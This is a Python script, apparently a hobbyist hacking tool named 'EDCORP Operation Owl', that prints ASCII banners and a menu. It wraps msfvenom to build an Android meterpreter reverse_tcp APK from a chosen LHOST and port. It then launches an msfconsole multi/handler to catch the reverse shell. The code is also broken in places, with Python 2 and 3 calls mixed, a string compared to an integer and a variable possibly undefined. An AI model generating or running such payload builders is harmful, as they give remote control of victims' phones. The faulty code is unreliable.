import os as matrix
import sys as n
import time as mm
from platform import system

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def slow(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(5. / 100)
        
def clear():
    if system() == 'Linux':
       matrix.system("clear")
    else:
       pass
       
clear()
              
slow(G+'''

[]    [][][] [][][] [][]_  [] []\[] [][][]
[]    []  [] ||__|| []  [] [] ||\|| [] =[]
##### ###### ##  ## ###### ## ## ## #####  ### ### ### ### 

[] [][][] [][][] ()//
[] []  [] []  []  //
## ###### ###### //()

''')

clear()

def slo(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(2. / 100)
        

slo(P+'''
_____    _
| ____|__| | ___ ___  _ __ _ __  
|  _| / _` |/ __/ _ \| '__| '_ \  
| |__| (_| | (_| (_) | |  | |_) |
|_____\__,_|\___\___/|_|  | .__/          
                          |_|''') 
slow(O+'''WELCOME TO EDCORP OPERATION OWL...''') 
slow(P+'''Tool created by Frost Edson''')
                                                   
slo(R+'''        
                *********
              (*** ^ ^ ***)   
            (**** (0 0) ****)
             (****  v *****)
            ----**--+--**----''')
            
print(R+'''['''+G+'''01'''+R+''']'''+O+'''Generate a payload...''')
print(R+'''['''+G+'''02'''+R+''']'''+O+'''Listen...''')
print(R+'''['''+G+'''03'''+R+''']'''+O+'''Exit...''')

number = input(G+'''owl>>>''')

def payload():
    
    numper = input(G+'''Owl>>>''')
    
    if numper == 1:
       LHOST = raw_input("enter the LHOST>>")
       LPORT = input ("enter the port>>")
       name = raw_input('name payload>>')

       matrix.system('msfvenom -p android/meterpreter/reverse_tcp  LHOST={} LPORT={}   -o/$HOME/{}.apk'.format(LHOST,LPORT,name))
       ass = raw_input("Do you want to make a listening session y/n }}")
       if ass == "y":
          matrix.system("msfconsole -x  'use multi/handler ; set payload android/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
    else:
          ex = input('Do you want to go out y/n}}')
    if ex == 'y':
           clear()
    
def payload_page():
    
    if int(number) == 1:
       clear()
       print(P+'''
____             _                 _
|  _ \ __ _ _   _| | ___   __ _  __| |
| |_) / _` | | | | |/ _ \ / _` |/ _` |
|  __/ (_| | |_| | | (_) | (_| | (_| |
|_|   \__,_|\__, |_|\___/ \__,_|\__,_|
            |___/''')
       print(R+'''['''+G+'''01'''+R+''']'''+O+'''payload/android...''')
       print(R+'''['''+G+'''02'''+R+''']'''+O+'''payload/windows...''')
       payload()
       
    else:
        pass

def cmatrix():
    if system == 'Linux':
       matrix.system("cmatrix")
    else:
       pass

payload_page()
cmatrix()

       

